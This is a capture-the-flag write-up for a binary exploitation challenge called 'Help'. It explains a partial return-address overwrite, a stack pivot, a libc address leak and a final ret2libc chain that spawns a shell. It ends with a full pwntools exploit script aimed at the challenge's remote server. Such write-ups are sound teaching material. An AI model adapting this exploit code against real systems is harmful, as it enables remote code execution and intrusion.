# Help

This one's a whirlwind, and it's a bit complex, so I'll lay it out in parts.

* Lots and lots of functions. The structure of the execution of the program is a little nested. Honestly, it doesn't matter much or at all. There are two functions we must focus on - ok, and finallyyouhelpedme
* Function: ok. This function has a global counter, on the sixth time it runs, we get an input. It reads 0x29 bytes into rbp-0x20 - giving us full control over RBP and partial control over the return address. By partial, I mean one byte. This is enough to send the binary to 0x40017XX, as the return address saved begins with 0x40017 and we can overwrite one byte of it. What can we do with this?
* Function: finallyyouhelpedme. It has two inputs. One that was irrelevant for what I did, but probably useful for other methods. It read into a global variable. The second one is a proper buffer overflow - 0x40 bytes read into rbp-0x20. This gives us control over saved RBP, and enough to make a 24-byte ROP chain.

finallyyouhelpedme is never called - we must redirect ok's return address into it. We can overwrite the first byte of the return address with 0x1f, sending it into the 4th instruction of finallyyouhelped me, where our input begins. I jumped here so that I didn't have to deal with stack alignment, nor things messing up between rbp and rsp.

Now what? a 24-byte ropchain is enough to do poprdi + got address + plt address and leak a libc address, but we cant return back to a function for another input after that.

Wait! The input is at rbp-0x20. 0x20 is 32 - that's exactly enough to do poprdi + got address + plt address + address of finallyyouhelpedme. Perfect!

What we'll do here is called a stack pivot. We can change the location of rsp via a leave ; ret gadget in order to relocate the stack and force the program to start popping ret addresses from somewhere else.

In order to do that, we need to know whereabouts our input is. I accomplished this by controlling saved RBP. Let's think back to our first input in ok. We get full control of saved RBP here, and this will be the RBP that gets passed into finallyouhelpedme\(as we ret into the instruction after the whole push rbp;mov rbp,rsp mumbo jumbo\). Thus, we can force the stack into a specific place. As there's no PIE, the segment mapped RW is constant, so we can set it somewhere int here.

Ok, back to before. We force RBP into a known place inside of a RW segment, so we know exactly where our input is. Now, we can send:

rop chain + address of input - 8 + leave ret

leave will set rsp to rbp, then pop rbp off the stack. Setting it to input - 8 means some random value will be popped off.

In order to stop problems with this later, we ret straight into the beginning of the finallyyouhelpedme function. As this moves rbp up to rsp, it causes anything we might've messed up in the stack\(like that random rbp value...\) to be automatically fixed.

Our rop chain will then be poprdi + got address + puts@plt + finallyouhelpedme address

Now, we will receive a libc address\(write, specifically\) and another input. We can calculate the libc base off of this, and use the classic payload - system\("/bin/sh"\).

Final exploit:

1. Send 0x20 bytes of junk + address in RW segment + 0x1f
2. Send poprdi + got address + puts@plt + finallyyouhelpedme address + address of input - 8 + leave;ret gadget address
3. Receive libc address. Calculate base. Send dummy input\(first input, useless\) then send 0x28 bytes of junk\(rbp doesnt matter anymore\) + poprdi + /bin/sh address + system address

Script below.

```python
from pwn import *
import sys
mode = sys.argv[1]
NUM_TO_RBP = 0x20
NUM_TO_RET = NUM_TO_RBP + 8
pad1 = b'A' * NUM_TO_RBP
pad2 = b'A' * NUM_TO_RET
fakestack = 0x602000 - 0x200
poprdi = 0x0000000000400943 # pop rdi ; ret
ret = 0x00000000004005b6 # ret
leaveret = 0x0000000000400778 # leave ; ret
e = ELF("./chall2")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6" if mode == 'local' else '/home/kali/Tools/libc-database/libs/libc6_2.27-3ubuntu1_amd64/libc.so.6')
p = e.process() if mode == 'local' else remote('europe.pwn.zh3r0.ml', 7412)
payload = p64(fakestack) + b'\x1f'
p.recv()
p.sendline(pad1 + payload)
p.recv()
#leak = flat(fakestack, poprdi, e.got['write'],e.plt['puts'] , e.symbols['finallyyouhelpedme'],word_size=64)
bufaddr = fakestack-0x20
changer = flat(bufaddr-8,leaveret,word_size=64)
chain = flat(poprdi, e.got['write'],e.plt['puts'],e.symbols['finallyyouhelpedme'],word_size=64)
payload = chain
payload += b'B' * (NUM_TO_RBP - len(chain))
payload += changer
p.sendline(payload)
if mode == 'remote':
    p.recvlines(2)
output = p.recvline()[:-1] + b'\x00\x00'
leak = u64(output)
libcbase = leak - libc.symbols['write']
log.info(f"Libc puts leak: {hex(leak)}")
log.info(f"Libc base: {hex(libcbase)}")
libc.address = libcbase
final = flat(poprdi, next(libc.search(b"/bin/sh\x00")),libc.symbols['system'],word_size=64)
pause()
p.sendline('t')
p.recvlines(2)
p.sendline(pad2 + final)
p.interactive()
```

